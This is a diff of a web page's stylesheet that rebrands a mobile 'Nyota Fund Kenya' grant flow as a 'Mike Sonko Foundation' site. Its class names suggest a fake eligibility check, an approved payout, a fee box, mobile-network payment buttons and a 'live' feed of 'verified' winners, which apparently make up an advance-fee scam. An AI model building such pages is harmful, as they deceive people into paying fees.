@@ -1,1707 +1,1188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>NYOTA FUND KENYA PHASE 2</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Mike Sonko Foundation | Dignity & Opportunity</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ----- RESET & BASE ----- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        /* ===== COMPACT STYLES (same as before) ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; line-height: 1.5; color: #1e2a2e; background: #f0f4fa; }
+        :root {
+            --primary-blue: #0a66c2;
+            --deep-navy: #1a2f4f;
+            --accent-gold: #d4a017;
+            --accent-gold-dark: #b8860b;
+            --card-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
         }
-
-        body {
-            background-color: #005A36;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100dvh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 8px;
-            margin: 0;
+        .page { max-width: 1280px; margin: 0 auto; padding: 1.5rem 1.2rem; display: none; animation: fadeIn 0.3s ease; }
+        .page.active-page { display: block; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(8px);} to { opacity:1; transform:translateY(0);} }
+        #homePage {
+            background: url('https://images.unsplash.com/photo-1593113598332-cd288d649433?w=1600&q=80') no-repeat center center fixed;
+            background-size: cover; position: relative; z-index: 1;
         }
-
-        .phone-frame {
-            max-width: 420px;
-            width: 100%;
-            background-color: #005A36;
-            border-radius: 28px;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.6);
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            height: auto;
-            min-height: 95dvh;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            transition: all 0.2s;
+        #homePage::before { content: ""; position: fixed; inset:0; background: rgba(0,0,0,0.15); backdrop-filter: brightness(0.92); z-index:-1; }
+        #homePage .card, #homePage .program-card, #homePage .stats-row .stat-badge {
+            background: rgba(255,255,248,0.88); backdrop-filter: blur(4px);
+            border: 1px solid rgba(10,102,194,0.25);
         }
-
-        /* ----- SCREENS ----- */
-        .screen {
-            display: none;
-            flex-direction: column;
-            flex: 1;
-            padding: 16px 18px 20px;
-            animation: fadeUp 0.4s ease forwards;
-            overflow-y: auto;
-            scrollbar-width: thin;
-            scrollbar-color: rgba(255,255,255,0.2) transparent;
+        .card { background: #ffffff; border-radius: 2rem; box-shadow: var(--card-shadow); padding: 1.5rem; margin-bottom: 1.5rem; border: 1px solid #eef2f6; }
+        .stats-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 1rem; margin: 1.2rem 0 0.2rem; }
+        .stat-badge {
+            background: linear-gradient(145deg, #fef9f0, #fff4e0);
+            padding: 0.5rem 1.2rem; border-radius: 60px; display: flex; align-items: baseline; gap: 0.5rem;
+            border-left: 4px solid var(--accent-gold); white-space: nowrap;
         }
-
-        .screen.active {
-            display: flex;
+        .stat-number { font-size: 1.6rem; font-weight: 800; color: var(--deep-navy); }
+        .stat-label { font-size: 0.8rem; font-weight: 600; color: var(--accent-gold-dark); text-transform: uppercase; }
+        .programmes-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; margin: 1.5rem 0; }
+        .program-card {
+            border-radius: 1.5rem; padding: 1.4rem; border: 1px solid #e2edf7; transition: all 0.25s;
+            cursor: pointer; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.03); display: flex; flex-direction: column;
         }
-
-        @keyframes fadeUp {
-            0% { opacity: 0; transform: translateY(12px); }
-            100% { opacity: 1; transform: translateY(0); }
+        .prog-title { font-size: 1.45rem; font-weight: 700; color: var(--deep-navy); border-left: 5px solid var(--accent-gold); padding-left: 12px; margin-bottom: 0.7rem; }
+        .prog-desc { color: #2c3e50; margin: 0.6rem 0; font-size: 0.9rem; flex: 1; }
+        .help-count { background: #eef2ff; display: inline-flex; align-items: center; padding: 0.25rem 0.9rem; border-radius: 40px; font-size: 0.75rem; font-weight: 700; color: var(--primary-blue); }
+        .apply-now-btn {
+            background: linear-gradient(135deg, var(--accent-gold), var(--accent-gold-dark));
+            display: inline-flex; align-items: center; padding: 0.25rem 0.9rem; border-radius: 40px;
+            font-size: 0.75rem; font-weight: 700; color: white; cursor: pointer; border: none;
+            font-family: inherit; transition: all 0.2s; box-shadow: 0 2px 8px rgba(212, 160, 23, 0.3);
         }
-
-        /* ----- SCROLLBAR ----- */
-        .screen::-webkit-scrollbar {
-            width: 3px;
+        .apply-now-btn:hover { transform: scale(1.02); box-shadow: 0 4px 12px rgba(212, 160, 23, 0.5); }
+        .form-group { margin-bottom: 14px; }
+        .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #212529; margin-bottom: 6px; }
+        .form-group label .required { color: #fa5252; }
+        .input-wrapper { position: relative; width: 100%; }
+        .input-wrapper input, .input-wrapper select {
+            width: 100%; height: 48px; padding: 0 36px 0 12px;
+            border: 1.5px solid #a5b4fc; border-radius: 10px;
+            font-family: inherit; font-size: 0.95rem; background: white; outline: none;
+            transition: all 0.2s ease; color: #212529;
         }
-        .screen::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
+        .input-wrapper input:focus, .input-wrapper select:focus { border-color: var(--primary-blue); box-shadow: 0 0 0 3px rgba(10,102,194,0.15); }
+        .input-wrapper.valid input, .input-wrapper.valid select { border-color: #2e7d32; }
+        .input-wrapper.invalid input, .input-wrapper.invalid select { border-color: #fa5252; background-color: #fff5f5; }
+        .error-msg { color: #fa5252; font-size: 0.72rem; margin-top: 4px; display: none; font-weight: 500; }
+        .input-wrapper.invalid + .error-msg { display: block; }
+        .form-row { display: flex; gap: 12px; margin-bottom: 14px; }
+        .form-row > .form-group { flex: 1; margin-bottom: 0; }
+        .btn-primary {
+            width: 100%; height: 52px;
+            background: linear-gradient(135deg, var(--primary-blue), var(--deep-navy));
+            color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700;
+            cursor: pointer; transition: all 0.2s; display: flex; align-items: center; justify-content: center;
+            gap: 8px; margin-top: 10px; font-family: inherit; box-shadow: 0 4px 12px rgba(10,102,194,0.25);
         }
-
-        /* ----- TYPOGRAPHY & COLORS ----- */
-        .gold {
-            color: #E8C84A;
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(10,102,194,0.35); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .btn-gold { background: linear-gradient(135deg, var(--accent-gold), var(--accent-gold-dark)); box-shadow: 0 4px 12px rgba(212,160,23,0.3); }
+        .btn-gold:hover { box-shadow: 0 6px 20px rgba(212,160,23,0.5); }
+        .card-header-vibrant {
+            background: linear-gradient(135deg, #1a2f4f, #0a66c2);
+            color: #ffffff; padding: 24px 20px; border-radius: 24px 24px 0 0;
+            position: relative; overflow: hidden;
         }
-        .gold-bg {
-            background: #E8C84A;
-            color: #005A36;
+        .card-header-vibrant::after { content: "✦"; position: absolute; right: 20px; bottom: 10px; font-size: 4rem; opacity: 0.1; color: var(--accent-gold); }
+        .card-header-vibrant .step-info { font-size: 0.72rem; opacity: 0.9; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-header-vibrant .step-title { font-size: 1.25rem; font-weight: 800; margin-bottom: 6px; line-height: 1.3; }
+        .card-header-vibrant .step-sub { font-size: 0.85rem; opacity: 0.9; line-height: 1.4; }
+        .card-body-white { padding: 20px; background: #ffffff; }
+        .amount-display {
+            text-align: center; padding: 24px;
+            background: linear-gradient(145deg, #fef9f0, #fff4e0);
+            border-radius: 16px; margin: 16px 0; border: 2px solid var(--accent-gold);
+            box-shadow: 0 8px 20px rgba(212,160,23,0.2); position: relative; overflow: hidden;
         }
-        .text-muted {
-            color: #555555;
-            font-size: 0.8rem;
-        }
-        .text-small {
-            font-size: 0.7rem;
-        }
-        .fw-bold {
-            font-weight: 700;
-        }
-        .mt-1 { margin-top: 6px; }
-        .mt-2 { margin-top: 12px; }
-        .mt-3 { margin-top: 18px; }
-        .mb-1 { margin-bottom: 6px; }
-        .mb-2 { margin-bottom: 12px; }
-        .text-center { text-align: center; }
-
-        /* ----- BRAND HEADER / LOGO ----- */
-        .brand-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 18px;
-            background-color: #005A36;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-            flex-shrink: 0;
-        }
-
-        /* Welcome screen specific header (White) */
-        #screen-welcome .brand-header {
-            background-color: #FFFFFF;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        #screen-welcome .brand-header .brand-logo .logo-text {
-            color: #005A36;
-        }
-        #screen-welcome .brand-header .brand-logo .logo-sub {
-            color: #555555;
-        }
-        #screen-welcome .brand-header .badge-ke {
-            background: #005A36;
-            color: #FFFFFF;
-        }
-
-        .brand-logo {
-            display: flex;
-            flex-direction: column;
-            line-height: 1.1;
-        }
-        .brand-logo .logo-text {
-            font-size: 1.2rem;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-            color: #FFFFFF;
-        }
-        .brand-logo .logo-sub {
-            font-size: 0.5rem;
-            font-weight: 400;
-            color: #c0dcc8;
-            letter-spacing: 0.3px;
-            text-transform: uppercase;
-            max-width: 200px;
-        }
-        .brand-logo .logo-tagline {
-            font-size: 0.45rem;
-            font-style: italic;
-            color: #E8C84A;
-            letter-spacing: 0.2px;
-        }
-        .badge-ke {
-            background: rgba(255, 255, 255, 0.15);
-            color: #E8C84A;
-            padding: 2px 12px;
-            border-radius: 30px;
-            font-size: 0.6rem;
-            font-weight: 700;
-            letter-spacing: 1px;
-            border: 1px solid rgba(255,255,255,0.1);
-            flex-shrink: 0;
-        }
-
-        /* ----- SPONSOR LINE (on green pages) ----- */
-        .sponsor-line {
-            font-size: 0.55rem;
-            color: #80a090;
-            text-align: center;
-            padding-top: 10px;
+        .amount-display::before { content: "♥"; position: absolute; right: -10px; bottom: -20px; font-size: 6rem; opacity: 0.06; color: var(--accent-gold-dark); }
+        .amount-display .label { font-size: 0.72rem; color: #666; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+        .amount-display .value { font-size: 2.8rem; font-weight: 900; color: var(--accent-gold-dark); margin: 4px 0; text-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .amount-display .sub { font-size: 0.75rem; color: #555; font-weight: 500; }
+        .amount-display .tiny-note {
             margin-top: 10px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            letter-spacing: 0.3px;
-            flex-shrink: 0;
-        }
-        .sponsor-line strong {
-            color: #E8C84A;
+            font-size: 0.7rem;
+            color: #666;
+            background: rgba(255,255,255,0.5);
+            padding: 6px 12px;
+            border-radius: 20px;
+            display: inline-block;
             font-weight: 500;
         }
-
-        /* WELCOME PAGE specific overrides */
-        #screen-welcome {
-            background-color: #FFFFFF;
+        .fee-box {
+            background: linear-gradient(145deg, #fff8e1, #ffecb3);
+            border: 2px solid var(--accent-gold); border-radius: 16px;
+            padding: 18px; margin: 18px 0; box-shadow: 0 4px 12px rgba(212,160,23,0.15);
         }
-        #screen-welcome .sponsor-line {
-            color: #888888;
-            border-top-color: #e0e0e0;
+        .fee-box .title { font-weight: 700; color: var(--accent-gold-dark); font-size: 0.95rem; }
+        .fee-box .amount { font-size: 2rem; font-weight: 900; color: var(--accent-gold-dark); margin: 6px 0; }
+        .fee-box .sub { font-size: 0.75rem; color: #bf360c; line-height: 1.4; }
+        .approved-badge-card {
+            background: linear-gradient(135deg, #f0f4fa, #e6edf5);
+            border-radius: 8px; padding: 12px; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; margin-top: 20px;
+            font-weight: 700; font-size: 0.72rem; color: var(--deep-navy);
+            text-align: center; letter-spacing: 0.3px; border: 1px solid #d0d9e8;
         }
-        #screen-welcome .sponsor-line strong {
-            color: #005A36;
+        .feed-container { max-height: 220px; overflow-y: auto; padding-right: 4px; }
+        .feed-item { display: flex; align-items: flex-start; gap: 10px; padding: 10px 12px; border-bottom: 1px solid #f0f0f0; animation: slideIn 0.3s ease; text-align: left; }
+        .feed-item:last-child { border-bottom: none; }
+        @keyframes slideIn { from { opacity:0; transform:translateX(-10px); } to { opacity:1; transform:none; } }
+        .feed-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.8rem; color: white; flex-shrink: 0; }
+        .feed-content { flex: 1; }
+        .feed-name { font-weight: 700; font-size: 0.85rem; color: #212529; }
+        .feed-name .verified { color: #2e7d32; font-size: 0.65rem; margin-left: 4px; font-weight: 600; }
+        .feed-text { font-size: 0.8rem; color: #495057; margin-top: 2px; line-height: 1.35; }
+        .feed-time { font-size: 0.65rem; color: #868e96; margin-top: 2px; }
+        .feed-live { display: inline-block; background: #e53935; color: white; font-size: 0.55rem; font-weight: 800; padding: 2px 8px; border-radius: 10px; animation: pulse 1.5s infinite; letter-spacing: 0.3px; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 3000; padding: 20px; }
+        .modal-overlay.open { display: flex; }
+        .modal-box { background: white; border-radius: 20px; padding: 28px 24px; width: 100%; max-width: 400px; animation: modalIn 0.25s ease; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.25); }
+        @keyframes modalIn { from { opacity: 0; transform: scale(0.95) translateY(16px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+        .modal-icon { width: 56px; height: 56px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.6rem; }
+        .modal-icon.warning { background: #fff3e0; color: var(--accent-gold-dark); }
+        .modal-title { font-size: 1.25rem; font-weight: 800; margin-bottom: 6px; }
+        .modal-desc { font-size: 0.85rem; color: #6c757d; margin-bottom: 16px; line-height: 1.45; }
+        .modal-status { font-size: 0.75rem; padding: 8px 12px; border-radius: 8px; margin: 10px 0; display: none; font-weight: 500; line-height: 1.3; }
+        .modal-status.show { display: block; }
+        .modal-status.pending { background: #fff8e1; color: #e65100; }
+        .modal-status.success { background: #e8f5e9; color: #2e7d32; }
+        .modal-status.error { background: #fce4ec; color: #fa5252; }
+        .btn-outline { background: transparent; border: 1.5px solid var(--primary-blue); color: var(--primary-blue); border-radius: 10px; font-weight: 700; cursor: pointer; transition: all 0.2s; padding: 14px; font-family: inherit; }
+        .btn-outline:hover { background: #f0f4ff; }
+        .success-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 5000; padding: 20px; }
+        .success-overlay.open { display: flex; }
+        .success-box { background: white; border-radius: 24px; padding: 32px 24px; max-width: 420px; width: 100%; text-align: center; animation: fadeIn 0.4s ease; border: 3px solid var(--accent-gold); }
+        .success-box .big-icon { font-size: 4rem; margin-bottom: 12px; }
+        .success-box .title { font-size: 1.5rem; font-weight: 900; color: var(--deep-navy); }
+        .success-box .sub { font-size: 0.9rem; color: #333; margin: 8px 0 16px; }
+        .success-box .details { background: #f8fafc; border-radius: 12px; padding: 16px; text-align: left; font-size: 0.85rem; margin-bottom: 20px; }
+        .success-box .details div { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid #eef2f6; }
+        .success-box .details div:last-child { border-bottom: none; }
+        .network-btn {
+            width: 100%; padding: 14px 16px; border: 1.5px solid #ced4da; background: #fff;
+            border-radius: 10px; display: flex; align-items: center; justify-content: space-between;
+            cursor: pointer; transition: all 0.2s;
         }
-        #screen-welcome .welcome-sub {
-            color: #555555;
+        .network-btn:hover { background: #f8f9fa; }
+        .network-btn.network-selected { border-color: var(--accent-gold); background: #fef9f0; box-shadow: 0 0 0 3px rgba(212,160,23,0.2); }
+        .network-radio { width: 20px; height: 20px; border: 2px solid #ced4da; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .network-btn.network-selected .network-radio { border-color: var(--accent-gold); }
+        .network-btn.network-selected .network-radio::after { content: ""; width: 10px; height: 10px; background: var(--accent-gold); border-radius: 50%; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #212529; color: white; padding: 12px 24px; border-radius: 12px; font-size: 0.85rem; font-weight: 600; z-index: 4000; display: none; max-width: 90%; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (max-width: 680px) {
+            .page { padding: 1rem; } .card { padding: 1rem; }
+            .form-row { flex-direction: column; gap: 0; }
+            .form-row > .form-group { margin-bottom: 14px; }
+            .stats-row { gap: 0.6rem; } .stat-badge { padding: 0.4rem 0.8rem; }
+            .stat-number { font-size: 1.2rem; } .stat-label { font-size: 0.65rem; }
+            .modal-box { padding: 20px 16px; }
+            .amount-display .value { font-size: 2rem; }
         }
-        #screen-welcome .welcome-title {
-            color: #222222;
-        }
-
-        /* ----- WELCOME SCREEN ----- */
-        .welcome-icon {
-            font-size: 2.8rem;
-            text-align: center;
-            margin: 10px 0 4px;
-        }
-        .welcome-title {
-            font-size: 1.3rem;
-            font-weight: 700;
-            text-align: center;
-            line-height: 1.3;
-        }
-        .welcome-sub {
-            text-align: center;
-            color: #555555;
-            font-size: 0.85rem;
-            margin-top: 4px;
-        }
-        .btn-group {
+        .footer { text-align: center; margin-top: 1.8rem; font-size: 0.65rem; color: #6c7a89; padding: 0.8rem; border-top: 1px solid #e2e8f0; }
+        #formsArea { display: none; flex-direction: column; align-items: center; padding: 16px 12px 60px; width: 100%; }
+        .container { width: 100%; max-width: 440px; background: #ffffff; border-radius: 24px; overflow: hidden; box-shadow: var(--card-shadow); }
+        .page { display: none; animation: fadeIn 0.3s ease; }
+        .page.active { display: block; }
+        .hero-sub { font-size:1rem; color:var(--accent-gold-dark); border-bottom:2px solid var(--accent-gold); display:inline-block; padding-bottom:4px; }
+        h1 { font-size:2rem; } h2 { font-size:1.5rem; }
+        .back-btn { background:none; border:none; font-size:1.5rem; cursor:pointer; color:#fff; width:36px; height:36px; border-radius:50%; transition:background 0.2s; }
+        .back-btn:hover { background:rgba(255,255,255,0.15); }
+        .nav-header { display:flex; align-items:center; gap:12px; margin-bottom:12px; }
+        /* ---- Eligibility Check Styles ---- */
+        .check-item {
             display: flex;
-            gap: 14px;
-            justify-content: center;
-            margin-top: 16px;
-        }
-        .btn {
-            padding: 12px 32px;
-            border: none;
-            border-radius: 40px;
-            font-size: 0.95rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
-            min-width: 100px;
-            letter-spacing: 0.5px;
-        }
-        .btn-yes {
-            background: #E8C84A;
-            color: #005A36;
-        }
-        .btn-yes:hover {
-            background: #f0d86a;
-            transform: scale(1.02);
-        }
-        .btn-no {
-            background: transparent;
-            color: #555555;
-            border: 2px solid #cccccc;
-        }
-        .btn-no:hover {
-            border-color: #E8C84A;
-            color: #005A36;
-        }
-
-        /* ----- FORM SCREEN (green background, white card form) ----- */
-        #screen-form {
-            background-color: #005A36;
-        }
-        .form-title, .form-sub {
-            color: #FFFFFF;
-        }
-        .form-title {
-            font-size: 1.1rem;
-            font-weight: 700;
-            margin-bottom: 2px;
-        }
-        .form-sub {
-            font-size: 0.7rem;
-            color: #c0dcc8;
-            margin-bottom: 12px;
-        }
-
-        /* The main white card wrapping the whole form */
-        .form-card {
-            background: #FFFFFF;
-            padding: 24px 20px;
-            border-radius: 20px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
-            margin-bottom: 12px;
-        }
-
-        .form-group {
-            margin-bottom: 16px;
-        }
-        .form-group:last-of-type {
-            margin-bottom: 0;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 0.8rem;
-            font-weight: 600;
-            color: #333333;
-            margin-bottom: 4px;
-        }
-        .form-group label .required {
-            color: #E8C84A;
-        }
-
-        .form-group input,
-        .form-group select {
-            width: 100%;
-            padding: 12px 14px;
-            background: #f4f6f9;
-            border: 1px solid #e2e6eb;
-            border-radius: 10px;
-            color: #222;
-            font-size: 0.9rem;
-            outline: none;
-            transition: all 0.2s;
-        }
-        .form-group input:focus,
-        .form-group select:focus {
-            border-color: #E8C84A;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 16px;
+            border: 1.5px solid #eef2f6;
+            border-radius: 12px;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
             background: #ffffff;
-            box-shadow: 0 0 0 3px rgba(232, 200, 74, 0.15);
+            text-align: left;
         }
-        .form-group input::placeholder {
-            color: #999;
+        .check-item.pending {
+            border-style: dashed;
+            opacity: 0.55;
         }
-        .form-group select option {
-            background: #FFFFFF;
-            color: #222222;
+        .check-item.active {
+            border-color: var(--primary-blue);
+            border-style: dashed;
+            background: #f0f4ff;
         }
-
-        .form-hint {
-            font-size: 0.65rem;
-            color: #888;
-            margin-top: 4px;
+        .check-item.completed {
+            border-color: #c3e6cb;
+            background: #f4faf6;
+            color: #155724;
+            font-weight: 600;
         }
-
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-        .form-row .form-group {
-            margin-bottom: 0;
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background: #E8C84A;
-            color: #005A36;
-            border: none;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 12px;
-            letter-spacing: 0.5px;
-        }
-        .btn-submit:hover {
-            background: #f0d86a;
-        }
-
-        /* Approved badge & sponsor on form screen (green bg) */
-        #screen-form .approved-badge {
-            color: #80a090;
-            border-top-color: rgba(255,255,255,0.05);
-        }
-        #screen-form .approved-badge .ke {
-            color: #8bc34a;
-        }
-        #screen-form .sponsor-line {
-            color: #80a090;
-            border-top-color: rgba(255,255,255,0.05);
-        }
-        #screen-form .sponsor-line strong {
-            color: #E8C84A;
-        }
-
-        /* ----- PROCESSING SCREEN ----- */
-        #screen-processing {
-            background-color: #005A36;
-        }
-        .processing-icon {
-            text-align: center;
-            font-size: 2.4rem;
-            margin: 14px 0 6px;
-        }
-        .processing-title {
-            font-size: 1.2rem;
-            font-weight: 700;
-            text-align: center;
-            color: #FFFFFF;
-        }
-        .processing-sub {
-            text-align: center;
-            color: #c0dcc8;
-            font-size: 0.8rem;
-            margin-top: 2px;
-        }
-        .spinner {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 16px 0;
-        }
-        .spinner span {
-            display: block;
-            width: 10px;
-            height: 10px;
-            background: #E8C84A;
-            border-radius: 50%;
-            animation: pulse 1.4s infinite ease-in-out both;
-        }
-        .spinner span:nth-child(2) { animation-delay: 0.2s; }
-        .spinner span:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes pulse {
-            0%, 80%, 100% { transform: scale(0.4); opacity: 0.4; }
-            40% { transform: scale(1); opacity: 1; }
-        }
-
-        /* ----- PURPOSE SCREEN ----- */
-        #screen-purpose {
-            background-color: #005A36;
-        }
-        .purpose-title {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #FFFFFF;
-        }
-        .purpose-name {
-            color: #E8C84A;
-        }
-        #screen-purpose > div:not(.purpose-list):not(.approved-badge):not(.sponsor-line) {
-            color: #FFFFFF;
-        }
-        .purpose-list {
-            list-style: none;
-            margin: 10px 0;
-            background: #FFFFFF;
-            border-radius: 14px;
-            padding: 4px 0;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-        }
-        .purpose-list li {
-            padding: 12px 18px;
-            margin: 0 4px;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: 0.2s;
-            font-weight: 500;
-            color: #222222;
-            border-bottom: 1px solid #f0f0f0;
-        }
-        .purpose-list li:last-child {
-            border-bottom: none;
-        }
-        .purpose-list li:hover {
-            background: #f7f7f7;
-        }
-        .purpose-list li.selected {
-            background: #F0E8C8;
-            color: #005A36;
-            border-color: #E8C84A;
-            box-shadow: 0 0 0 1px #E8C84A;
-        }
-        .purpose-list li .num {
-            color: #E8C84A;
-            font-weight: 700;
-            margin-right: 10px;
-        }
-        .btn-continue {
-            width: 100%;
-            padding: 14px;
-            background: #E8C84A;
-            color: #005A36;
-            border: none;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 4px;
-        }
-        .btn-continue:hover {
-            background: #f0d86a;
-        }
-        .btn-continue:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
-
-        /* ----- ELIGIBILITY CHECK ----- */
-        #screen-eligibility {
-            background-color: #005A36;
-        }
-        .elig-title {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #FFFFFF;
-        }
-        .elig-name {
-            color: #E8C84A;
-        }
-        #screen-eligibility > div:not(.checklist):not(.sponsor-line) {
-            color: #FFFFFF;
-        }
-        .checklist {
-            margin: 12px 0;
-            background: #FFFFFF;
-            border-radius: 14px;
-            padding: 6px 16px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-        }
-        .checklist .item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 10px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 0.85rem;
-            color: #222222;
-        }
-        .checklist .item:last-child {
-            border-bottom: none;
-        }
-        .checklist .item .icon {
-            width: 20px;
-            text-align: center;
-            font-size: 0.9rem;
-        }
-        .checklist .item .icon.done {
-            color: #4CAF50;
-        }
-        .checklist .item .icon.pending {
-            color: #999999;
-        }
-        .checklist .item .icon.spin {
-            color: #E8C84A;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* ----- APPROVAL SCREEN ----- */
-        #screen-approval {
-            background-color: #005A36;
-        }
-        .approval-icon {
-            text-align: center;
-            font-size: 2.8rem;
-            margin: 4px 0 2px;
-        }
-        .approval-title {
-            font-size: 1.3rem;
-            font-weight: 700;
-            text-align: center;
-            color: #FFFFFF;
-        }
-        .approval-name {
-            color: #E8C84A;
-        }
-        .approval-sub {
-            text-align: center;
-            color: #c0dcc8;
-            font-size: 0.75rem;
-            margin-top: 2px;
-        }
-        .amount-box {
-            background: #FFFFFF;
-            border-radius: 16px;
-            padding: 16px;
-            text-align: center;
-            margin: 12px 0;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-        }
-        .amount-box .ksh {
-            font-size: 2.4rem;
-            font-weight: 800;
-            color: #005A36;
-        }
-        .amount-box .sub {
-            font-size: 0.7rem;
-            color: #4CAF50;
-        }
-        .btn-withdraw {
-            width: 100%;
-            padding: 14px;
-            background: #E8C84A;
-            color: #005A36;
-            border: none;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 2px;
-        }
-        .btn-withdraw:hover {
-            background: #f0d86a;
-        }
-        .withdraw-note {
-            text-align: center;
-            font-size: 0.65rem;
-            color: #c0dcc8;
-            margin-top: 4px;
-        }
-
-        /* ----- COMMUNITY FEED (white container) ----- */
-        .feed {
-            background: #FFFFFF;
-            border-radius: 14px;
-            padding: 10px 14px;
-            margin: 10px 0 4px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-        }
-        .feed-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.65rem;
-            font-weight: 700;
-            color: #005A36;
-            margin-bottom: 6px;
-        }
-        .feed-header .live {
-            color: #e74c3c;
-            font-size: 0.55rem;
-            background: #fde8e8;
-            padding: 2px 10px;
-            border-radius: 20px;
-        }
-        .feed-scroll {
-            max-height: 110px;
-            overflow-y: auto;
-            scrollbar-width: thin;
-            scrollbar-color: #dddddd transparent;
-        }
-        .feed-scroll::-webkit-scrollbar {
-            width: 3px;
-        }
-        .feed-scroll::-webkit-scrollbar-thumb {
-            background: #dddddd;
-            border-radius: 10px;
-        }
-        .feed-item {
-            display: flex;
-            gap: 10px;
-            align-items: flex-start;
-            padding: 6px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 0.65rem;
-            color: #333333;
-        }
-        .feed-item:last-child {
-            border-bottom: none;
-        }
-        .feed-item .avatar {
+        .check-circle {
             width: 24px;
             height: 24px;
             border-radius: 50%;
-            background: #f0f0f0;
+            border: 2px solid #ced4da;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: 700;
-            font-size: 0.55rem;
-            color: #005A36;
             flex-shrink: 0;
-        }
-        .feed-item .body {
-            flex: 1;
-        }
-        .feed-item .body .name {
-            font-weight: 600;
-            color: #222222;
-        }
-        .feed-item .body .badge {
-            font-size: 0.5rem;
-            color: #4CAF50;
-            background: #e8f5e9;
-            padding: 0 6px;
-            border-radius: 10px;
-        }
